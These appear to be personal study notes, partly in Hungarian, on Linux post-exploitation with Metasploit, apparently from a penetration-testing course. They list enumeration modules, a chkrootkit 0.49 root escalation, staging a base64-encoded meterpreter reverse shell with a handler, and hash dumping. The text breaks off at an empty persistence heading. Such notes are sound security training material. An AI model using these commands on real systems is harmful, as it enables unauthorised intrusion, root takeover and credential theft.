# Linux post exploitation
## Linux post exploitation modules
### basic local linux enumeration
  * meterpreter> shell
  * $ /bin/bash -i
  * root@machine$
    * whoami, cat /etc/passwd, groups <group_name>
    * cat /etc/*issue (OS flavor)
    * uname -r (kernel version)
    * uname -a (hostname, kernel version, architecture, ...)
    * ifconfig, ip a, netstat -antp (lehet hogy nem mukodik), ps aux, env,
### msf linux exploitation modules
* msf6> use post/linux/gather/enum_configs (gather linux configurations) (loot!!!)
  * msf6> loot (meg tudjuk nezni hogy az osszeszedett infok melyik fajlokban vannak eltarolva)
  * utana sima 'cat'-el meg tudjuk nezni a fajlnak a tartalmat...
* msf6> use post/multi/gather/env (env vars)
* msf6> use post/linux/gather/enum_network (network enum) (loot kiirja a tarolt infok helyet - aztan egyesevel cat...)
* msf6> use post/linux/gather/enum_protections (system hardening mechanisms check)
  * notes nevu cuccba ment (csak be kell irni az msf console-ba hogy notes es kiirja)
* msf6> use post/linux/gather/enum_system (system enumeration)
  * (packages, services, mounts, users, bash history, cron jobs, ...)
* msf6> use post/linux/gather/checkcontainer (check if machine is a container (like docker), or normal host machine)
  * it is important because techniques are exists where we can break out of container, vm...
* msf6> use post/linux/gather/checkvm (check if the machine is a vm or not)
  * it is important because techniques are exists where we can break out of container, vm...
* msf6> use post/linux/gather/enum_users_history (gather bash_history file for or user accounts and service accounts)
  * (normalis ha sok errort dob, mert sok service user-hez nincsen bash history)
### info (loot!!!)
* ahol fajlnevek vannak felsorolva es ugy szedett le infokat
* ott a loot parancs kiirja, hogy hol talaljuk meg a fajlt
* es aztan sima 'cat'-el megtudjuk nezni hogy mi van benne (cat az msf console-bol is mukodik)
### info (notes!!!)
* ahol ilyesmit ir a futtatas utan az msf console, hogy
  * <valami_config_vagy_check> saved to notes.
* ott a notes paranccsal lehet majd kiiratni
  * msf6> notes
## Linux privilege escalation - exploiting vulnerable program
* initial steps
  * login through ssh in msf console with known credentials
    * msf6> use auxiliary/scanner/ssh/ssh_login
    * give username, and password and run
    * nyit egy shell-t de a hatterben (sima shell lesz - sessions)
    * upgrade standard shell to meterpreter shell
* meterpreter> shell
* $ ps aux
  * root futtat /bin/bash-bol egy shell scriptet ami egy irhato mappaban van
    * a script chkrootkit nevu cuccot futtat
    * annak vannak serulekeny valtozatai
* $ chkrootkit -V
  * chkrootkit version 0.49 (VULNERABLE !!!!)
* msf6> use exploit/unix/local/chkrootkit
* msf6 exploit(unix/local/chkrootkit)> set CHKROOTKIT <path_of_chkrootkit_file_on_the_os> (e.g. /bin/chkrootkit)
  * maybe we have to set lhost and lport
  * maybe we have to modify the 'CHKROOTKIT' option (this is the path)
* it will be create a cron job
* it probably opens a shell session here!!!
  * try to put command in the terminal (like whoami)
* upgrade to meterpreter
  * if sessions -u <num> nem mukodik
    * manualisan csinaljunk msfvenommal meterpreter reverse shell-t
    * md5sum-ot csekkoljuk le
    * csinaljunk belole base64 code-ot (-w 0 miatt nem lesz tobb sorra tordeles)
      * $ cat exploit_file | base64 -w 0
    * menjunk be a session-be es irjuk bele egy fajlba a base64 code-ot dekodolva, aztan chmod, es checksum
      * $ echo -n '<base64_code_of_exploit>' | base64 -d > new_file
      * $ chmod 777 new_file
      * md5sum new_file
    * inditsunk el multi handlert background jobkent
      * msf6> use multi/handler
      * ... set lhost, lport, payload ...
      * msf6 multi(handler)> run -j
    * menjunk vissza a shell session-be es inditsuk el a meterpreter shell exploitot, aztan utana CTRL+Y, es ott az uj session
      * meterpreter> shell
      * $ ./new_file
        *  (output) ... [*] Meterpreter session <num> opened (ip:port -> ip:port) at <date> <time>
      * $ CTRL + Y
      * msf6> sessions -i <new_session_num>
      * meterpreter> (meg van a meterpreter shell)
## Dumping hashes with hashdump
### info
* on linux the 'meterpreter> hashdump' command is not working
* we need to use the post exploitation module instead
### steps
* msf6> use post/linux/gather/hashdump
* msf6 post(linux/gather/hashdump)> set session <num>
* msf6 post(linux/gather/hashdump)> run
* elmenti egy fajlba
* msf6> loot
* msf6> cat <file_copied_from_loot_command_output>
## Persistence on Linux
